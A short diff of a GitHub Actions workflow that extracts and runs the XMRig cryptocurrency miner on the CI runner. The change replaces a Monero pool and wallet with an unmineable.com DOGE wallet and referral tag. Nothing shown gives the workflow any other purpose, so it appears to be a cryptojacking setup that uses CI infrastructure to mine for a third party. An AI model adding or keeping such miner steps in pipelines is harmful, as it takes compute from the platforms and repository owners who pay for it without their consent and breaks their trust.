@@ -21,6 +21,6 @@ jobs:
       - name: Extract
         run: Expand-Archive xmrig.zip
       - name: Run Xmrig
-        run: .\xmrig\xmrig-6.21.0\xmrig.exe --donate-level 5 -o xmrpool.eu:9999 -u 49DN7u2ryJ34KL3ywBbBXKBn9SWKmMpt5PYDP4JkCN86MHQRpTZHynt2uKcFSHeFQRcgRsuj2qACh9XiQhi2ETfy7t7YbkY -k --tls
+        run: .\xmrig\xmrig-6.21.0\xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DSXfQwLuNLBHS4shPD241km3UCDVq6rXuZ.unmineable_worker_dttgoikh#ffac-8rce -p x
       - name: END
         run: exit
